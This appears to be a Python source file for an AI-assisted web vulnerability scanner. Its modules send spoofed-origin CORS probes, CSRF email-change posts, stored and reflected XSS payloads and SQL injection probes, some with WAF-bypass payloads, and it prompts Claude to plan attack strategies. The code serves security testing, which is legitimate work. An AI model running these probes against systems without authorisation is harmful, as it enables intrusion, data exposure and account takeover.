"""
AttackTrace Advanced Attack Suite — Adaptive Intelligence Web Security Scanner.

Architecture:
  Layer 1: Crawler        — BFS link/form/API discovery, auth-aware
  Layer 2: Pattern Engine — 5700+ bug bounty report patterns (attack_patterns.py)
  Layer 3: AI Planner     — Claude fingerprints target, plans prioritised attack strategy
  Layer 4: 17 Modules     — Systematic testing of all discovered endpoints

Top vulnerability categories (from 5708 real bug bounty reports):
  IDOR (1854), CORS (1050), CSRF (660), Stored XSS (611),
  Privilege Escalation (276), GraphQL (175), Open Redirect (168),
  Account Takeover (167), Cache Poisoning (104), SSRF (79)
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
import uuid
from datetime import datetime, timezone
from typing import Annotated, AsyncGenerator, Optional
from urllib.parse import urljoin, urlparse, urlunparse, urlencode, parse_qs

import httpx
from fastapi import APIRouter, Depends, File, Form, HTTPException, UploadFile, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, field_validator

from app.core.dependencies import get_current_user, require_tool
from app.core.config import get_settings
from app.models.db.user import User
from app.services.waf_service import detect_waf, get_waf_bypass_payloads
from app.api.v1.attack_patterns import (
    CORS_ATTACK_ORIGINS, CORS_SENSITIVE_PATHS, CORS_WILDCARD_API_PATHS,
    CSRF_SENSITIVE_ACTIONS,
    XSS_PAYLOADS, XSS_TEST_PARAMS,
    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_ERROR_PATTERNS, SQLI_TEST_PARAMS,
    SQLI_REST_ENDPOINTS,
    SSRF_PARAMS, SSRF_TARGETS,
    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
    PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS, MASS_ASSIGNMENT_ROLE_FIELDS,
    ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS, ATO_EMAIL_CHANGE_ENDPOINTS,
    CACHE_POISON_HEADERS, CACHE_POISON_VALUES,
    RACE_CONDITION_ENDPOINTS,
    BUSINESS_LOGIC_TESTS,
    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_BATCH, GRAPHQL_AUTH_BYPASS_QUERIES,
    JWT_WEAK_SECRETS, JWT_KID_PAYLOADS,
    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
    TECH_SIGNATURES, COMMON_SENSITIVE_PATHS,
    REST_API_PATHS, MONITORING_PATHS,
    # New patterns for expanded modules
    SSTI_PAYLOADS, SSTI_INDICATORS, SSTI_TEST_FIELDS,
    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS, NOSQL_REST_ENDPOINTS, NOSQL_SLEEP_PAYLOADS,
    XXE_PAYLOADS, XXE_INDICATORS,
    FILE_UPLOAD_PATHS,
    INFO_DISCLOSURE_PATHS, INFO_DISCLOSURE_INDICATORS,
    WEAK_CREDENTIAL_PAIRS,
    PROTOTYPE_POLLUTION_PAYLOADS,
    DOM_XSS_PAYLOADS,
    COUPON_CODES, BUSINESS_LOGIC_BASKET_ATTACKS,
    JWT_ALG_NONE_VARIANTS,
    SENSITIVE_AUTH_ENDPOINTS,
)

router = APIRouter(prefix="/attack-suite", tags=["AttackSuite"])
settings = get_settings()
_scan_history: dict[str, dict] = {}

MODULES_META = [
    {"id": "crawl",         "label": "Web Crawler",           "description": "BFS crawl to discover all endpoints, forms, and parameters before testing"},
    {"id": "headers",       "label": "Security Headers",       "description": "Missing/misconfigured HTTP security headers (CSP, HSTS, CORS, X-Frame-Options)"},
    {"id": "cors",          "label": "CORS Misconfiguration",  "description": "Reflected origin, null origin, subdomain bypass — #2 in bug bounty dataset (1050 reports)"},
    {"id": "csrf",          "label": "CSRF Bypass",            "description": "SameSite bypass, missing CSRF tokens, login CSRF — #3 in dataset (660 reports)"},
    {"id": "xss",           "label": "XSS Scanner",            "description": "Reflected & stored XSS in discovered forms and URL params — 611 stored XSS reports"},
    {"id": "sqli",          "label": "SQL Injection",          "description": "Time-based blind and error-based SQLi across all discovered parameters"},
    {"id": "ssrf",          "label": "SSRF Prober",            "description": "Cloud metadata, internal services — 79 SSRF + 18 blind SSRF reports"},
    {"id": "idor",          "label": "IDOR Scanner",           "description": "Cross-account access testing on crawled endpoints — #1 in dataset (1854 reports)"},
    {"id": "privilege",     "label": "Privilege Escalation",   "description": "Mass assignment, role tampering, admin paths — 276 reports"},
    {"id": "account",       "label": "Account Takeover",       "description": "Password reset host injection, email change, OAuth flow — 167 reports"},
    {"id": "cache",         "label": "Cache Poisoning",        "description": "Unkeyed header injection (X-Forwarded-Host, X-Host) — 104 reports"},
    {"id": "race",          "label": "Race Conditions",        "description": "Parallel request attacks on state-changing endpoints — 39 reports"},
    {"id": "business",      "label": "Business Logic",         "description": "Negative price, quantity overflow, coupon stacking — 51 reports"},
    {"id": "graphql",       "label": "GraphQL Inspector",      "description": "Introspection, batch abuse, auth bypass — 175 reports + top Amazon endpoint"},
    {"id": "jwt",           "label": "JWT Analyzer",           "description": "alg:none, weak secrets, kid injection, claims exposure — 60 reports"},
    {"id": "redirect",      "label": "Open Redirect",          "description": "OAuth redirect_uri, redirect param bypass — 168 reports, chains to ATO"},
    {"id": "auth_bypass",   "label": "Auth Bypass",            "description": "Admin paths, X-Forwarded-For, method override, sensitive file exposure"},
    {"id": "nosql",         "label": "NoSQL Injection",        "description": "MongoDB operator injection, NoSQL DoS, aggregation-based data extraction"},
    {"id": "ssti",          "label": "SSTI Detection",         "description": "Server-side template injection in Jinja2, Freemarker, Twig, SpEL, ERB"},
    {"id": "xxe",           "label": "XXE Injection",          "description": "XML External Entity attacks on XML-accepting endpoints and file upload"},
    {"id": "file_upload",   "label": "File Upload Bypass",     "description": "Extension bypass, null-byte, size limit, type restriction bypass"},
    {"id": "broken_auth",   "label": "Broken Authentication",  "description": "Weak/default credentials, password strength, brute-force protection"},
    {"id": "info_disclosure","label": "Information Disclosure", "description": "FTP directory, forgotten backups, .env files, Git exposure, log files"},
    {"id": "deserialization","label": "Insecure Deserialization","description": "Prototype pollution, zip bomb, XML billion laughs"},
]

# ── Models ────────────────────────────────────────────────────────────────────

class CrawlerConfig(BaseModel):
    enabled: bool = True
    max_depth: int = 3
    max_pages: int = 100
    respect_robots: bool = True

class LoginConfig(BaseModel):
    enabled: bool = False
    login_url: str = ""
    username: str = ""
    password: str = ""
    username_field: str = "username"    # field name for form/json login
    password_field: str = "password"
    login_type: str = "form"            # form | bearer | basic | cookie | rest_json
    bearer_token: str = ""
    cookie: str = ""
    # rest_json: path inside JSON response where the token lives
    # e.g. "authentication.token" for Juice Shop, "access_token" for OAuth
    token_path: str = "access_token"

class Account2Config(BaseModel):
    """Second account for IDOR testing (cross-account access)."""
    enabled: bool = False
    login_url: str = ""
    username: str = ""
    password: str = ""
    login_type: str = "rest_json"       # form | bearer | basic | cookie | rest_json
    token_path: str = "access_token"
    bearer_token: str = ""
    cookie: str = ""

class AttackSuiteRequest(BaseModel):
    target: str
    modules: list[str] = [m["id"] for m in MODULES_META]
    auth_headers: dict[str, str] = {}
    follow_redirects: bool = True
    timeout: int = 10
    crawler: CrawlerConfig = CrawlerConfig()
    login: LoginConfig = LoginConfig()
    account2: Account2Config = Account2Config()
    ai_analysis: bool = True          # Use Claude to plan strategy + analyse responses

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: str) -> str:
        v = v.strip().rstrip("/")
        if not v:
            raise ValueError("Target is required")
        if re.search(r"[;&|`$(){}<>]", v):
            raise ValueError("Target contains invalid characters")
        if not v.startswith(("http://", "https://")):
            raise ValueError("Target must start with http:// or https://")
        return v

    @field_validator("timeout")
    @classmethod
    def validate_timeout(cls, v: int) -> int:
        return max(5, min(v, 60))


def _finding(module: str, test_name: str, severity: str, title: str,
             description: str, evidence: str, url: str, is_vulnerable: bool,
             remediation: str, confidence: str = "medium") -> dict:
    return {
        "id": str(uuid.uuid4()),
        "module": module,
        "test_name": test_name,
        "severity": severity,
        "confidence": confidence,
        "title": title,
        "description": description,
        "evidence": evidence,
        "url": url,
        "is_vulnerable": is_vulnerable,
        "remediation": remediation,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


def _sse(event: str, data: dict) -> str:
    return f"event: {event}\ndata: {json.dumps(data)}\n\n"


# ── Crawler ───────────────────────────────────────────────────────────────────

class CrawlResult:
    def __init__(self):
        self.pages: list[dict] = []          # {url, status, headers, body_snippet}
        self.forms: list[dict] = []          # {url, action, method, inputs}
        self.endpoints: set[str] = set()     # all discovered URLs
        self.params: dict[str, set] = {}     # url -> set of parameter names
        self.tech_stack: list[str] = []
        self.ids_found: list[str] = []       # numeric/UUID IDs in URLs


async def _crawl(target: str, client: httpx.AsyncClient,
                 cfg: CrawlerConfig) -> CrawlResult:
    result = CrawlResult()
    visited: set[str] = set()
    queue: list[tuple[str, int]] = [(target, 0)]
    parsed_base = urlparse(target)

    while queue and len(visited) < cfg.max_pages:
        url, depth = queue.pop(0)
        if url in visited or depth > cfg.max_depth:
            continue
        visited.add(url)

        try:
            r = await client.get(url, timeout=8, follow_redirects=True)
        except httpx.HTTPError:
            continue

        result.endpoints.add(url)
        body = r.text[:50000]

        result.pages.append({
            "url": url,
            "status": r.status_code,
            "content_type": r.headers.get("content-type", ""),
            "headers": dict(r.headers),
            "body_snippet": body[:500],
        })

        # Fingerprint tech stack
        _fingerprint(r, result)

        # Extract IDs from URL
        for id_val in re.findall(r'/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', url):
            result.ids_found.append(id_val)

        # Only crawl HTML pages
        ct = r.headers.get("content-type", "")
        if "text/html" not in ct:
            continue

        # Extract links
        for href in re.findall(r'href=["\']([^"\'#]+)["\']', body):
            abs_url = urljoin(url, href).split("?")[0].split("#")[0]
            parsed = urlparse(abs_url)
            if parsed.netloc == parsed_base.netloc and abs_url not in visited:
                queue.append((abs_url, depth + 1))

        # Extract forms
        for form_match in re.finditer(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            body, re.DOTALL | re.IGNORECASE
        ):
            action, method, form_body = form_match.groups()
            abs_action = urljoin(url, action) if action else url
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*/?>',
                                form_body, re.IGNORECASE)
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']',
                                   form_body, re.IGNORECASE)
            result.forms.append({
                "source_url": url,
                "action": abs_action,
                "method": method.upper() or "GET",
                "inputs": inputs + textareas,
            })

        # Extract JS API calls
        for api_path in re.findall(r'["\'](/api/[\w/\-_.{}?=&%]+)["\']', body):
            abs_api = urljoin(target, api_path)
            if urlparse(abs_api).netloc == parsed_base.netloc:
                result.endpoints.add(abs_api)

        await asyncio.sleep(0)

    return result


def _fingerprint(r: httpx.Response, result: CrawlResult) -> None:
    headers_str = str(dict(r.headers)).lower()
    body_lower = r.text[:5000].lower()
    server = r.headers.get("server", "").lower()
    powered_by = r.headers.get("x-powered-by", "").lower()

    for tech, sig in TECH_SIGNATURES.items():
        for signal in sig["signals"]:
            if signal.lower() in headers_str or signal.lower() in body_lower:
                if tech not in result.tech_stack:
                    result.tech_stack.append(tech)
                break


# ── SPA Detection ────────────────────────────────────────────────────────────

async def _detect_spa_fallback(target: str, client: httpx.AsyncClient) -> int:
    """
    Detect if target is a SPA with catch-all routing.

    Many SPAs (Angular, React, Vue) return index.html for every unknown path.
    This causes massive false positives for path-based tests (sensitive files,
    admin paths, account takeover endpoints) because every path returns HTTP 200.

    Strategy: request two random nonexistent paths. If both return 200 with the
    same content length as the root page, the server is serving a SPA fallback.

    Returns the fallback content length if SPA detected, else 0.
    """
    try:
        canary1 = f"{target}/__attacktrace_{uuid.uuid4().hex[:8]}__"
        canary2 = f"{target}/nonexistent_{uuid.uuid4().hex[:8]}/path"
        r0, r1, r2 = await asyncio.gather(
            client.get(target, timeout=8),
            client.get(canary1, timeout=8),
            client.get(canary2, timeout=8),
            return_exceptions=True,
        )
        if isinstance(r0, Exception) or isinstance(r1, Exception) or isinstance(r2, Exception):
            return 0
        # SPA: all three return 200 and same content length
        if (r1.status_code == 200 and r2.status_code == 200
                and abs(len(r1.content) - len(r0.content)) < 200
                and abs(len(r2.content) - len(r0.content)) < 200):
            return len(r1.content)
    except Exception:
        pass
    return 0


def _is_spa_fallback(response: httpx.Response, fallback_size: int) -> bool:
    """Returns True if this response looks like the SPA fallback page."""
    if fallback_size <= 0:
        return False
    return abs(len(response.content) - fallback_size) < 200


# ── Login Manager ─────────────────────────────────────────────────────────────

async def _perform_login(client: httpx.AsyncClient, cfg: LoginConfig,
                         target: str) -> dict[str, str]:
    """Returns auth headers to inject for authenticated requests."""
    if not cfg.enabled:
        return {}

    if cfg.login_type == "bearer":
        return {"Authorization": f"Bearer {cfg.bearer_token}"}

    if cfg.login_type == "basic":
        creds = base64.b64encode(f"{cfg.username}:{cfg.password}".encode()).decode()
        return {"Authorization": f"Basic {creds}"}

    if cfg.login_type == "cookie":
        return {"Cookie": cfg.cookie}

    if cfg.login_type == "rest_json":
        login_url = cfg.login_url or f"{target}/api/login"
        try:
            payload = {
                cfg.username_field: cfg.username,
                cfg.password_field: cfg.password,
            }
            lr = await client.post(
                login_url,
                json=payload,
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=10,
                follow_redirects=True,
            )
            if lr.status_code < 400:
                try:
                    data = lr.json()
                    # Navigate dot-path like "authentication.token"
                    token = data
                    for part in cfg.token_path.split("."):
                        if isinstance(token, dict):
                            token = token.get(part)
                        else:
                            token = None
                            break
                    if token and isinstance(token, str):
                        return {"Authorization": f"Bearer {token}"}
                    # Fallback: scan top-level keys
                    for key in ["access_token", "token", "accessToken", "jwt", "id_token"]:
                        if key in data and isinstance(data[key], str):
                            return {"Authorization": f"Bearer {data[key]}"}
                except Exception:
                    pass
        except httpx.HTTPError:
            pass

    if cfg.login_type == "form":
        login_url = cfg.login_url or f"{target}/login"
        try:
            # First get CSRF token if present
            r = await client.get(login_url, timeout=10)
            csrf = ""
            for name in ["csrf_token", "csrfmiddlewaretoken", "_csrf", "authenticity_token"]:
                m = re.search(
                    rf'<input[^>]*name=["\']?{re.escape(name)}["\']?[^>]*value=["\']([^"\']+)["\']',
                    r.text, re.IGNORECASE)
                if m:
                    csrf = m.group(1)
                    break

            payload = {
                cfg.username_field: cfg.username,
                cfg.password_field: cfg.password,
            }
            if csrf:
                payload["csrf_token"] = csrf
                payload["csrfmiddlewaretoken"] = csrf

            lr = await client.post(login_url, data=payload, timeout=10,
                                   follow_redirects=True)

            cookies = dict(lr.cookies)
            if cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                return {"Cookie": cookie_str}

            # Check for JWT in response JSON
            try:
                data = lr.json()
                for key in ["access_token", "token", "accessToken", "jwt", "id_token"]:
                    if key in data:
                        return {"Authorization": f"Bearer {data[key]}"}
            except Exception:
                pass
        except httpx.HTTPError:
            pass

    return {}


# ── AI Strategy Planner ───────────────────────────────────────────────────────

async def _ai_plan_attack(target: str, tech_stack: list[str],
                          endpoints: list[str], modules: list[str]) -> str:
    """Use Claude to generate a prioritised attack strategy."""
    if not settings.ANTHROPIC_API_KEY:
        return ""
    try:
        import anthropic
        client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
        prompt = f"""You are an expert bug bounty hunter analyzing a target for security vulnerabilities.

Target: {target}
Detected tech stack: {', '.join(tech_stack) if tech_stack else 'unknown'}
Discovered endpoints (sample): {json.dumps(endpoints[:20])}
Modules to run: {', '.join(modules)}

Based on the tech stack and endpoints, provide a BRIEF prioritised attack strategy (max 200 words):
1. Which vulnerability types are most likely given this tech stack?
2. Which endpoints should be tested first?
3. Any specific payloads or techniques to prioritise?

Be specific and actionable. Focus on high-severity findings."""

        msg = await client.messages.create(
            model=settings.AI_MODEL,
            max_tokens=300,
            messages=[{"role": "user", "content": prompt}],
        )
        return msg.content[0].text
    except Exception:
        return ""


async def _ai_analyze_response(module: str, test_name: str, url: str,
                                request_info: str, response_info: str) -> str:
    """Ask Claude whether a response indicates a real vulnerability."""
    if not settings.ANTHROPIC_API_KEY:
        return ""
    try:
        import anthropic
        client = anthropic.AsyncAnthropic(api_key=settings.ANTHROPIC_API_KEY)
        msg = await client.messages.create(
            model=settings.AI_MODEL,
            max_tokens=200,
            messages=[{"role": "user", "content": (
                f"Security test result — analyze for real vulnerability:\n"
                f"Module: {module} | Test: {test_name}\n"
                f"URL: {url}\n"
                f"Request: {request_info[:300]}\n"
                f"Response: {response_info[:400]}\n\n"
                f"Is this a real vulnerability? Severity? What follow-up should I do? "
                f"Answer in 2-3 sentences max."
            )}],
        )
        return msg.content[0].text
    except Exception:
        return ""


# ── Module: Security Headers ──────────────────────────────────────────────────

async def _module_headers(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    try:
        r = await client.get(target, timeout=10)
        h = {k.lower(): v for k, v in r.headers.items()}

        checks = [
            ("strict-transport-security" not in h, "hsts_missing", "medium",
             "Missing HSTS Header",
             "No Strict-Transport-Security header. Enables protocol downgrade attacks.",
             "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
            ("content-security-policy" not in h, "csp_missing", "medium",
             "Missing Content-Security-Policy",
             "No CSP header. XSS attacks can execute arbitrary scripts without restriction.",
             "Implement a restrictive Content-Security-Policy with default-src 'self'"),
            (not h.get("x-frame-options") and "frame-ancestors" not in h.get("content-security-policy", ""),
             "clickjacking", "medium",
             "Clickjacking Risk (No X-Frame-Options / frame-ancestors)",
             "Page can be embedded in attacker-controlled iframes for clickjacking attacks.",
             "Add X-Frame-Options: DENY or CSP frame-ancestors 'none'"),
            (h.get("x-content-type-options", "").lower() != "nosniff",
             "xcto_missing", "low",
             "Missing X-Content-Type-Options: nosniff",
             "Browser MIME-sniffing can cause content-type confusion attacks.",
             "Add: X-Content-Type-Options: nosniff"),
            ("referrer-policy" not in h, "referrer_policy", "low",
             "Missing Referrer-Policy",
             "URL parameters may leak to third parties via Referer header.",
             "Add: Referrer-Policy: strict-origin-when-cross-origin"),
            ("permissions-policy" not in h and "feature-policy" not in h,
             "permissions_policy", "info",
             "Missing Permissions-Policy",
             "No restrictions on browser features (camera, microphone, geolocation).",
             "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"),
        ]

        for condition, test_name, severity, title, desc, rem in checks:
            if condition:
                yield _finding("headers", test_name, severity, title, desc,
                               f"Response headers: {dict(list(h.items())[:10])}", target, True, rem)

        server = h.get("server", "")
        if server and any(c.isdigit() for c in server):
            yield _finding("headers", "server_version", "low",
                "Server Version Disclosure",
                f"Server header reveals software version, aiding fingerprinting.",
                f"Server: {server}", target, True,
                "Configure server to suppress version in the Server header.")

        if "x-powered-by" in h:
            yield _finding("headers", "x_powered_by", "low",
                "X-Powered-By Technology Disclosure",
                f"Reveals backend technology: {h['x-powered-by']}",
                f"X-Powered-By: {h['x-powered-by']}", target, True,
                "Remove X-Powered-By header from all responses.")

        acao = h.get("access-control-allow-origin", "")
        if acao == "*" and h.get("access-control-allow-credentials", "").lower() == "true":
            yield _finding("headers", "cors_wildcard_creds", "high",
                "CORS Wildcard with Credentials",
                "ACAO: * combined with Allow-Credentials: true allows cross-origin credential theft.",
                f"ACAO: {acao}", target, True, "Specify explicit trusted origins.")

    except httpx.HTTPError as e:
        pass


# ── Module: CORS Misconfiguration ─────────────────────────────────────────────

async def _module_cors(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    parsed = urlparse(target)

    # ── Test 1: Wildcard ACAO on API endpoints ────────────────────────────────
    # Access-Control-Allow-Origin: * on endpoints returning user/sensitive data
    # allows any website to read the response via fetch(). While * can't be
    # combined with credentials (spec prevents it), it still exposes API data.
    wildcard_found = False
    for path in CORS_WILDCARD_API_PATHS[:8]:
        url = target + path
        try:
            r = await client.get(url, timeout=8)
            acao = r.headers.get("access-control-allow-origin", "")
            if acao == "*" and r.status_code == 200:
                # Check if the response contains actual data (not empty/error)
                body = r.text
                has_data = len(body) > 50 and r.headers.get("content-type", "").startswith("application/json")
                if has_data:
                    wildcard_found = True
                    yield _finding("cors", "cors_wildcard_api", "high",
                        f"CORS Wildcard on Data API: {path}",
                        f"API endpoint `{path}` returns data with `Access-Control-Allow-Origin: *`. "
                        f"Any website can read this response via cross-origin fetch(). "
                        f"If the endpoint returns user data, this is a data exposure vulnerability.",
                        f"URL: {url}\nACAO: *\nContent-Type: {r.headers.get('content-type','')}\n"
                        f"Response size: {len(body)} bytes",
                        url, True,
                        "Replace ACAO: * with an explicit allowlist of trusted origins. "
                        "Never use wildcard CORS on endpoints that return user-specific data.",
                        confidence="high")
                    break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 2: Reflected origin bypass ──────────────────────────────────────
    # Server echoes whatever Origin header is sent back in ACAO — allows any
    # attacker-controlled domain to read responses cross-origin.
    test_origins = [
        ("null", "null origin (sandboxed iframe)"),
        ("https://evil.example.com", "arbitrary origin"),
        (f"https://{parsed.netloc}.evil.com", "suffix bypass"),
        (f"https://evil.{parsed.netloc}", "prefix bypass"),
        (f"https://evil{parsed.netloc}", "no-dot prefix bypass"),
    ]

    test_paths = CORS_SENSITIVE_PATHS + ["/api/me", "/api/user", "/graphql"]

    for path in test_paths[:6]:
        url = target + path
        for origin, technique in test_origins:
            try:
                r = await client.options(url, headers={"Origin": origin,
                    "Access-Control-Request-Method": "GET"}, timeout=8)
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")

                if acao == origin or (origin != "null" and origin in acao):
                    sev = "critical" if acac.lower() == "true" else "high"
                    yield _finding("cors", f"cors_{technique.replace(' ', '_')}", sev,
                        f"CORS Reflected Origin — {technique}",
                        f"Origin `{origin}` is reflected in Access-Control-Allow-Origin"
                        + (" with credentials allowed — attacker can steal cookies/tokens" if acac.lower() == "true" else "")
                        + f". Technique: {technique}.",
                        f"Request Origin: {origin}\nACAO: {acao}\nACAC: {acac}", url, True,
                        "Implement strict CORS allowlist. Never reflect Origin header directly. "
                        "Never combine ACAO: * with Allow-Credentials: true.",
                        confidence="high")
                    return

                r2 = await client.get(url, headers={"Origin": origin}, timeout=8)
                acao2 = r2.headers.get("access-control-allow-origin", "")
                acac2 = r2.headers.get("access-control-allow-credentials", "")
                if acao2 == origin or (origin != "null" and origin in acao2):
                    sev = "critical" if acac2.lower() == "true" else "high"
                    yield _finding("cors", f"cors_get_{technique.replace(' ', '_')}", sev,
                        f"CORS Reflected Origin on GET — {technique}",
                        f"Origin `{origin}` reflected in ACAO on GET request to {path}.",
                        f"ACAO: {acao2}\nACAC: {acac2}", url, True,
                        "Implement strict CORS origin validation.",
                        confidence="high")
                    return

            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: CSRF ──────────────────────────────────────────────────────────────

async def _module_csrf(target: str, client: httpx.AsyncClient,
                       forms: list[dict]) -> AsyncGenerator[dict, None]:
    # ── Test 0: SameSite=None cookie detection ────────────────────────────────
    # SameSite=None means cookies are sent on cross-site requests — CSRF is
    # possible if there are no other mitigations (token, origin check).
    try:
        r = await client.get(target, timeout=8)
        for cookie_header in r.headers.get_list("set-cookie") if hasattr(r.headers, "get_list") else [r.headers.get("set-cookie", "")]:
            if cookie_header and "samesite=none" in cookie_header.lower():
                cookie_name = cookie_header.split("=")[0].strip()
                yield _finding("csrf", "samesite_none", "medium",
                    f"Session Cookie '{cookie_name}' Uses SameSite=None",
                    f"Cookie is sent on all cross-site requests, enabling CSRF attacks. "
                    f"Without a CSRF token or Origin validation, any site can trigger "
                    f"authenticated actions on behalf of the victim.",
                    f"Set-Cookie: {cookie_header[:200]}",
                    target, True,
                    "Change SameSite to 'Lax' or 'Strict'. Add a CSRF token to all "
                    "state-changing requests.",
                    confidence="medium")
                break
    except httpx.HTTPError:
        pass

    # ── Test 1: Missing CSRF token in forms ───────────────────────────────────
    for form in forms[:10]:
        action = form.get("action", "")
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        if method != "POST":
            continue

        csrf_inputs = [i for i in inputs if "csrf" in i.lower() or "token" in i.lower()
                       or "nonce" in i.lower()]
        if not csrf_inputs:
            yield _finding("csrf", "missing_csrf_token", "medium",
                f"No CSRF Token in POST Form",
                f"Form at {action} uses POST without a CSRF token field. "
                f"Inputs found: {inputs}",
                f"Form action: {action}\nMethod: POST\nInputs: {inputs}",
                action, True,
                "Add a CSRF token to all state-changing forms. Validate server-side.",
                confidence="medium")

    # Test sensitive endpoints for CSRF via content-type bypass
    parsed = urlparse(target)
    for path in CSRF_SENSITIVE_ACTIONS:
        url = target + path
        try:
            # Send JSON body as text/plain — SameSite bypass technique
            r = await client.post(url,
                content='{"email":"attacker@evil.com"}',
                headers={"Content-Type": "text/plain", "Origin": "https://evil.example.com"},
                timeout=8)
            if r.status_code not in (404, 405, 501):
                yield _finding("csrf", "csrf_content_type_bypass", "medium",
                    f"Potential CSRF via Content-Type Bypass on {path}",
                    f"Endpoint {path} returned {r.status_code} with text/plain content-type. "
                    f"May bypass CSRF protection relying on content-type validation.",
                    f"Status: {r.status_code}, Content-Type: text/plain bypass",
                    url, True,
                    "Validate CSRF tokens regardless of Content-Type. "
                    "Use SameSite=Strict cookies for session management.",
                    confidence="low")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: XSS ───────────────────────────────────────────────────────────────

async def _module_xss(target: str, client: httpx.AsyncClient,
                      forms: list[dict],
                      waf_bypass_payloads: list[str] | None = None) -> AsyncGenerator[dict, None]:
    # Reflected XSS via URL params
    payloads = XSS_PAYLOADS[:8]
    # Prepend WAF-specific bypass payloads if available
    if waf_bypass_payloads:
        payloads = list(waf_bypass_payloads) + payloads
    hit_params = set()

    for param in XSS_TEST_PARAMS[:8]:
        for payload in payloads[:3]:
            test_url = f"{target}?{param}={payload}"
            try:
                r = await client.get(test_url, timeout=8)
                ct = r.headers.get("content-type", "")
                if "text/html" in ct:
                    for sig in ["<script>alert", "onerror=alert", "onload=alert", "onfocus=alert"]:
                        if sig in r.text and param not in hit_params:
                            hit_params.add(param)
                            yield _finding("xss", "reflected_xss", "high",
                                f"Reflected XSS via '{param}' parameter",
                                f"Payload `{payload}` is reflected unescaped in HTML response.",
                                f"URL: {test_url}\nReflected payload: {payload[:80]}",
                                test_url, True,
                                "HTML-encode all user-supplied input before reflection. "
                                "Implement a strict Content-Security-Policy.",
                                confidence="high")
                            break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Stored XSS via forms
    for form in forms[:6]:
        method = form.get("method", "GET")
        action = form.get("action", target)
        inputs = form.get("inputs", [])
        if method != "POST" or not inputs:
            continue

        # Inject XSS into all text fields
        payload = '<img src=x onerror=alert("xss_test_at_' + str(int(time.time()))[-4:] + '")>'
        form_data = {inp: payload if not any(kw in inp.lower()
                                              for kw in ["password", "token", "csrf", "hidden"])
                     else "testvalue" for inp in inputs}
        try:
            r = await client.post(action, data=form_data, timeout=10)
            if "xss_test_at_" in r.text and any(
                sig in r.text for sig in ["onerror=alert", "src=x"]
            ):
                yield _finding("xss", "stored_xss", "critical",
                    f"Stored XSS via Form at {action}",
                    f"XSS payload persisted and reflected in response after POST.",
                    f"Form: {action}\nPayload: {payload[:80]}",
                    action, True,
                    "HTML-encode output from database. Validate and sanitise all user input.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # DOM XSS indicators
    try:
        r = await client.get(target, timeout=8)
        dom_sinks = ["document.write(", "innerHTML =", "innerHTML=",
                     "outerHTML =", "eval(", "setTimeout(", "location.href ="]
        for sink in dom_sinks:
            if sink in r.text:
                yield _finding("xss", "dom_xss_sink", "medium",
                    f"DOM XSS Sink Detected: {sink.strip()}",
                    f"JavaScript code uses dangerous DOM sink `{sink.strip()}` "
                    f"that may process attacker-controlled input.",
                    f"Sink found: {sink}\nURL: {target}",
                    target, True,
                    "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. "
                    "Sanitise before writing to DOM.",
                    confidence="low")
                break
    except httpx.HTTPError:
        pass


# ── Module: SQLi ──────────────────────────────────────────────────────────────

async def _module_sqli(target: str, client: httpx.AsyncClient,
                       forms: list[dict],
                       waf_bypass_payloads: list[str] | None = None) -> AsyncGenerator[dict, None]:
    # Baseline timing
    try:
        t0 = time.monotonic()
        await client.get(target, timeout=8)
        baseline = time.monotonic() - t0
    except Exception:
        baseline = 0.5

    # Augment error payloads with WAF-specific bypass payloads
    error_payloads = list(SQLI_ERROR_PAYLOADS)
    if waf_bypass_payloads:
        error_payloads = list(waf_bypass_payloads) + error_payloads

    # Test URL parameters
    for param in SQLI_TEST_PARAMS[:5]:
        # Error-based
        for quote in ["'", '"']:
            try:
                r = await client.get(f"{target}?{param}={quote}", timeout=8)
                bl = r.text.lower()
                if any(pat in bl for pat in SQLI_ERROR_PATTERNS):
                    yield _finding("sqli", "error_sqli_url", "high",
                        f"SQL Error Disclosure via '{param}' URL parameter",
                        f"SQL error string detected when injecting `{quote}` into `{param}`.",
                        f"URL: {target}?{param}={quote}\nSnippet: {r.text[:300]}",
                        target, True,
                        "Use parameterized queries. Never display DB errors to users.",
                        confidence="high")
                    break  # move to next param
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

        # Time-based (one payload, with delay check)
        if baseline < 1.5:
            payload = SQLI_TIME_PAYLOADS[0]
            try:
                t0 = time.monotonic()
                await client.get(f"{target}?{param}={payload}", timeout=10)
                elapsed = time.monotonic() - t0
                if elapsed >= 3.5 and elapsed > baseline * 3:
                    yield _finding("sqli", "time_sqli_url", "critical",
